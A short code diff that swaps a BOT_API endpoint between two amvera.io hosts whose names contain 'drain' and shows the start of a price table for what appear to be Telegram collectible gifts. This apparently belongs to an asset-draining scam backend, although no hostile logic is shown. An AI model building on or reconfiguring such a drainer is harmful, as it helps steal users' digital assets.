@@ -1,4 +1,4 @@
-export const BOT_API = "https://dyhj-testpdrain.amvera.io";
+export const BOT_API = "https://usnsjjd-drainnewjj.amvera.io";
 
 export const NFT_PRICES: Record<string, number> = {
   plushpepe: 5630, durovscap: 685, heartlocket: 974.99,
